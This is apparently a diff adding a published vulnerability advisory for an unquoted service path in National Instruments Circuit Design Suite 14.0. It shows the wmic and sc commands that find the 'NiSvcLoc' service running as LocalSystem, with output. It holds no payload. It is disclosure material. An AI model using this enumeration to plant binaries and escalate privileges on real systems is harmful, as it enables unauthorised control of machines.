@@ -1,0 +1,58 @@
+# Exploit Title: National Instruments Circuit Design Suite 14.0 - Local Privilege Escalation
+# Discovery Date: 2019-10-10
+# Exploit Author: Ivan Marmolejo
+# Vendor Homepage: http://www.ni.com/en-us.html
+# Software Link: https://www.ni.com/en-us/shop/select/circuit-design-suite
+# Version: 14.0
+# Vulnerability Type: Local
+# Tested on: Windows 10 Pro x64 Esp
+# Version: 10.0.18362
+
+# Exploit.txt
+
+##############################################################################################################################################
+
+Summary:        Circuit Design Suite combines Multisim and Ultiboard software to offer a complete set of tools for circuit design,simulation, 
+validation and design. Circuit Design Suite helps you design circuits with intuitive and cost-effective tools. You can perform an interactive 
+SPICE simulation and make a perfect transition to PCB design and routing software. Built for education, research and design, the suite offers
+advanced simulation capabilities to give you a clear view of how circuits perform in any situation.
+
+Description:    The application suffers from an unquoted search path issue impacting the service 'NiSvcLoc'. This could potentially allow an 
+authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require 
+the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could 
+potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges
+of the application.
+
+
+##############################################################################################################################################
+
+Step to discover the unquoted Service:
+
+ 
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+
+NI Service Locator           NiSvcLoc              C:\Program Files (x86)\National Instruments\Shared\niSvcLoc\nisvcloc.exe -s            Auto
+
+
+##############################################################################################################################################
+
+Service info:
+
+
+C:\Users\user>sc qc NiSvcLoc
+
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: NiSvcLoc
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files (x86)\National Instruments\Shared\niSvcLoc\nisvcloc.exe -s
+        GRUPO_ORDEN_CARGA  :
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : NI Service Locator
+        DEPENDENCIAS       :
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+##############################################################################################################################################
